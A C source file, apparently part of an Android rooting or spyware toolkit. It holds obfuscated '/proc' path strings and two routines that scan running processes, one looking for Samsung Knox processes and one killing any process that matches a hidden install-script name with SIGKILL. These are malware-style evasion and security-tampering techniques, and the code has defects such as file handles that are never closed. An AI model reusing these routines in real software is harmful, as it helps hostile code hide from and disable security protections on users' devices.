#include <sys/mount.h>
#include <sys/stat.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <sys/types.h>
#include <dirent.h>
#include "deobfuscate.h"
#include "utils.h"
#include "shell_params.h"

static unsigned char proc[] = "\x86\x7d\xfe\x5b\x0e\x0c\x1b\x1f"; // "/proc"
static unsigned char proc_cmd[] = "\x5b\x9d\xd6\x8c\x55\x5b\x4c\x48\x8c\x86\x58\x8c\x48\x4e\x41\x49\x52\x4f\x46"; // "/proc/%s/cmdline"


int find_process(char *str_ps) {
  DIR *dp;
  struct dirent *ep;
  char str[256];
  char out[256];
  FILE *f;
  struct stat st1;
  int pid;
  int ret = 0;

  dp = opendir(deobfuscate(proc));
  if (dp != NULL) {
    while (ep = readdir (dp)) {
      snprintf(str, sizeof(str), deobfuscate(proc_cmd), ep->d_name);
      if(stat(str, &st1) < 0) continue;
      // Check the process name
      f = fopen(str, "r");
      if(f != NULL) {
	// Look for knox PIDs
	fread(out, 1, sizeof(out), f);
	if(strcasestr(out, str_ps) != NULL) 
	  ret = 1;		
      }
    }
    
    closedir(dp);
  }

  return ret;
}


int kill_debuggerd(void) {
  DIR *dp;
  struct dirent *ep;
  char str[256];
  char out[256];
  FILE *f;
  struct stat st1;
  int pid;
  int ret = 0;

  dp = opendir(deobfuscate(proc));
  if (dp != NULL) {
    while (ep = readdir (dp)) {
      snprintf(str, sizeof(str), deobfuscate(proc_cmd), ep->d_name);
      if(stat(str, &st1) < 0) continue;
      // Check the process name
      f = fopen(str, "r");
      if(f != NULL) {
	// Look for knox PIDs
	fread(out, 1, sizeof(out), f);
	if(strcasestr(out, deobfuscate(INSTALL_SCRIPT)) != NULL) {
	  pid = strtoul(ep->d_name, NULL, 10);
	  // Stop it
	  kill(pid, SIGKILL);
	  ret = 1;
	}	
      }
    }
    
    closedir(dp);
  }

  return ret;
}
